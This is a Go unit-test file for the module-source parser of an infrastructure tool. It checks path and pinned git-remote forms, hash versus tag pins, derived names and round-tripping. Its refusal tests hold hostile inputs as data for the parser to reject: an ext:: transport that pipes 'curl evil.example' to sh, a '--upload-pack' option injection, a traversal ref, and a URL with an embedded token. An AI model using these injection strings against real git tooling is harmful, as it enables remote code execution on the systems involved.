package source

import (
	"reflect"
	"strings"
	"testing"

	"github.com/infrena/infrena/pkg/value"
)

var testOrigin = value.Origin{File: "infrena.yml", Line: 4, Column: 5}

func TestParseAcceptsTheThreeSourceForms(t *testing.T) {
	for _, tc := range []struct {
		name     string
		raw      string
		wantKind Kind
		wantLoc  string
		wantRef  string
	}{
		{"relative path", "./modules/networking", KindPath, "./modules/networking", ""},
		{"parent-relative path", "../shared/net", KindPath, "../shared/net", ""},
		{"absolute path", "/opt/infra/modules/net", KindPath, "/opt/infra/modules/net", ""},
		{"bare path", "modules/net", KindPath, "modules/net", ""},
		{"https pinned to a tag", "https://github.com/acme/infra-app-stack:v1.2.0",
			KindGit, "https://github.com/acme/infra-app-stack", "v1.2.0"},
		{"https with .git", "https://github.com/acme/infra-app-stack.git:v1.2.0",
			KindGit, "https://github.com/acme/infra-app-stack.git", "v1.2.0"},
		{"scp shorthand pinned to a hash", "git@github.com:acme/infra-database:9f3c1ab",
			KindGit, "git@github.com:acme/infra-database", "9f3c1ab"},
		{"ssh with a port", "ssh://git@git.example.com:2222/acme/repo:v1.0.0",
			KindGit, "ssh://git@git.example.com:2222/acme/repo", "v1.0.0"},
		{"tag containing a slash", "https://github.com/acme/repo:release/1.0",
			KindGit, "https://github.com/acme/repo", "release/1.0"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, ds := Parse(tc.raw, testOrigin)
			if ds.HasErrors() {
				t.Fatalf("Parse(%q) reported %+v, want it accepted", tc.raw, ds)
			}
			if s.Kind != tc.wantKind {
				t.Errorf("Kind = %v, want %v", s.Kind, tc.wantKind)
			}
			if s.Location != tc.wantLoc {
				t.Errorf("Location = %q, want %q", s.Location, tc.wantLoc)
			}
			if s.Ref != tc.wantRef {
				t.Errorf("Ref = %q, want %q", s.Ref, tc.wantRef)
			}
			// value.Origin carries a []string field, so it is not comparable
			// with == / != — reflect.DeepEqual is the stdlib substitute.
			if !reflect.DeepEqual(s.Origin, testOrigin) {
				t.Errorf("Origin = %+v, want the origin it was given: a diagnostic raised later must name the line the source was written on", s.Origin)
			}
		})
	}
}

// TestParseDistinguishesAHashPinFromATagPin is not cosmetic: Resolve skips the
// network for a hash pin and must NOT skip it for a tag pin, so a tag
// misclassified as a hash would make a moved tag undetectable.
func TestParseDistinguishesAHashPinFromATagPin(t *testing.T) {
	for raw, wantHash := range map[string]bool{
		"https://h/r:9f3c1ab": true,
		"https://h/r:34d6815f4599c14a529743d34402000ca8e52f7f": true,
		"https://h/r:v1.2.0":      false,
		"https://h/r:release/1.0": false,
		"https://h/r:9f3c1a":      false, // six chars: too short to be a hash
		"https://h/r:9f3c1abg":    false, // not hex
		"./modules/net":           false,
	} {
		s, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		if got := s.PinnedToHash(); got != wantHash {
			t.Errorf("Parse(%q).PinnedToHash() = %v, want %v", raw, got, wantHash)
		}
	}
}

func TestParseRefusals(t *testing.T) {
	for _, tc := range []struct {
		name      string
		raw       string
		want      []string // every one must appear in the rendered diagnostic
		forbidden []string // none of these may appear
	}{
		{
			name: "an unpinned https remote",
			raw:  "https://github.com/acme/infra-app-stack",
			want: []string{"is not pinned", ":v1.2.0", "plans differently"},
		},
		{
			// The last colon in this string separates the host from the
			// path, not the path from a ref. Split on it and the source
			// parses as pinned to "acme/infra-database", the guard never
			// fires, and git reports a missing ref instead.
			name: "an unpinned scp-shorthand remote",
			raw:  "git@github.com:acme/infra-database",
			want: []string{"is not pinned", "acme/infra-database"},
		},
		{
			name: "an ext:: transport",
			raw:  "ext::sh -c 'curl evil.example|sh'",
			want: []string{"ext::", "runs a shell command", "https://"},
		},
		{
			name: "a git:: transport helper",
			raw:  "git::https://example.invalid/net",
			want: []string{"git::", "https://example.invalid/net"},
		},
		{
			name: "a file:// url",
			raw:  "file:///srv/modules/net",
			want: []string{"file://", "/srv/modules/net"},
		},
		{
			name: "an http url",
			raw:  "http://github.com/acme/repo:v1",
			want: []string{"http", "https://", "ssh://"},
		},
		{
			name: "a flag",
			raw:  "--upload-pack=touch /tmp/pwned",
			want: []string{"begins with \"-\"", "option"},
		},
		{
			// The diagnostic must NOT echo the source: it holds the
			// secret, and this package has no redaction path.
			name:      "credentials in the url",
			raw:       "https://user:ghp_secret@github.com/acme/repo:v1",
			want:      []string{"credentials", "credential helper"},
			forbidden: []string{"ghp_secret"},
		},
		{
			name: "an empty ref",
			raw:  "https://github.com/acme/repo:",
			want: []string{"empty"},
		},
		{
			name: "a ref that traverses",
			raw:  "https://github.com/acme/repo:../../etc",
			want: []string{"not a valid tag or commit"},
		},
		{
			name: "a ref that is a flag",
			raw:  "https://github.com/acme/repo:-upload-pack",
			want: []string{"not a valid tag or commit"},
		},
		{
			name: "a remote with no repository path",
			raw:  "https://github.com:v1",
			want: []string{"no repository path"},
		},
		{
			name: "an empty source",
			raw:  "",
			want: []string{"empty"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, ds := Parse(tc.raw, testOrigin)
			if !ds.HasErrors() {
				t.Fatalf("Parse(%q) returned %+v with no error; this source must be refused", tc.raw, s)
			}
			var sb strings.Builder
			ds.Render(&sb)
			got := sb.String()
			for _, want := range tc.want {
				if !strings.Contains(got, want) {
					t.Errorf("diagnostic does not mention %q:\n%s", want, got)
				}
			}
			for _, never := range tc.forbidden {
				if strings.Contains(got, never) {
					t.Errorf("diagnostic contains %q, which must never be printed:\n%s", never, got)
				}
			}
			if !strings.Contains(got, "Suggested action:") {
				t.Errorf("diagnostic has no action:\n%s", got)
			}
			if !strings.Contains(got, "infrena.yml:4:5") {
				t.Errorf("diagnostic does not say where:\n%s", got)
			}
		})
	}
}

// TestParseNeverReturnsAGitSourceForAPath is the other half of the seam: the
// git tests in this package reach a local bare repository by building a Source
// literal, which is only honest if Parse cannot produce that combination from
// configuration. Delete the file:// refusal or the path branch and this fails.
func TestParseNeverReturnsAGitSourceForAPath(t *testing.T) {
	for _, raw := range []string{
		"/tmp/some/bare.git",
		"./bare.git",
		"../bare.git:v1.0.0", // a path that looks pinned is still a path
	} {
		s, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			continue // refused is also acceptable; classified as git is not
		}
		if s.Kind == KindGit {
			t.Errorf("Parse(%q).Kind = KindGit; a filesystem location must never be classified as a remote", raw)
		}
	}
}

func TestDeriveName(t *testing.T) {
	for raw, want := range map[string]string{
		"./modules/networking":                               "networking",
		"./modules/networking/":                              "networking",
		"/opt/infra/modules/app-stack":                       "app_stack",
		"https://github.com/acme/infra-app-stack:v1.2.0":     "infra_app_stack",
		"https://github.com/acme/infra-app-stack.git:v1.2.0": "infra_app_stack",
		// Strip order matters. ":ref" comes off before ".git" — reversed,
		// nothing strips (the string does not END in ".git") and the name
		// comes out as "infra.git", which is not an identifier. Here the
		// order is structural: Parse already removed the ref, and DeriveName
		// reads Location.
		"https://github.com/acme/infra.git:v1.2.0": "infra",
		// git's scp shorthand on a host with no owner segment. There is no
		// "/" in it at all, so a last-"/"-then-last-":" split derives the
		// HOST. This package owns that grammar, and it derives the
		// repository: infra_db.
		"git@github.com:infra-db:v1.0.0":                  "infra_db",
		"git@github.com:acme/infra-db:v1.0.0":             "infra_db",
		"ssh://git@git.example.com:2222/acme/repo:v1.0.0": "repo",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		got, ds := DeriveName(src)
		if ds.HasErrors() {
			t.Fatalf("DeriveName(%q): %+v", raw, ds)
		}
		if got != want {
			t.Errorf("DeriveName(%q) = %q, want %q", raw, got, want)
		}
	}
}

// TestDeriveNameRefusesWhatIsNotAnIdentifier. A derived name is used as
// `module.<name>` in a resource type, so it has to be an identifier; when it
// cannot be, the answer is a diagnostic telling the user to write `name:` —
// which is exactly why the mapping form of a `modules:` entry exists.
func TestDeriveNameRefusesWhatIsNotAnIdentifier(t *testing.T) {
	for _, raw := range []string{
		"./modules/.",
		"..",
		"./modules/2fast",
		"./modules/my module",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			continue // refused earlier is fine; deriving a bad name is not
		}
		name, ds := DeriveName(src)
		if !ds.HasErrors() {
			t.Errorf("DeriveName(%q) = %q with no diagnostic; it is not a usable module name", raw, name)
			continue
		}
		var sb strings.Builder
		ds.Render(&sb)
		if !strings.Contains(sb.String(), "name:") {
			t.Errorf("the diagnostic for %q does not tell the user to write `name:`, which is the only fix:\n%s", raw, sb.String())
		}
	}
}

// TestStringRoundTripsEveryAcceptedSource pins the decision that String() is an
// exact round trip and not a normalised rendering. `infrena export`
// regenerates a `modules:` entry from it, so a source that comes back with a
// trailing slash dropped or a ".git" restored would rewrite the user's own file
// under them.
//
// It is a property over every accepted spelling rather than a few examples,
// because the failure mode of a normalising String() is that it round-trips the
// examples somebody thought of.
func TestStringRoundTripsEveryAcceptedSource(t *testing.T) {
	for _, raw := range []string{
		"./modules/networking",
		"./modules/networking/", // the trailing slash must survive
		"/opt/infra/modules/net",
		"modules/net",
		"https://github.com/acme/infra-app-stack:v1.2.0",
		"https://github.com/acme/infra-app-stack.git:v1.2.0", // and the .git
		"https://GitHub.com/Acme/Repo:v1.2.0",                // and the case
		"git@github.com:acme/infra-database:9f3c1ab",
		"git@github.com:infra-db:v1.0.0",
		"ssh://git@git.example.com:2222/acme/repo:v1.0.0", // and the port
		"https://github.com/acme/repo:release/1.0",
	} {
		src, ds := Parse(raw, testOrigin)
		if ds.HasErrors() {
			t.Fatalf("Parse(%q): %+v", raw, ds)
		}
		if got := src.String(); got != raw {
			t.Errorf("Parse(%q).String() = %q; String must return the spelling the user wrote, because `infrena export` writes it back into their file", raw, got)
		}
	}
}
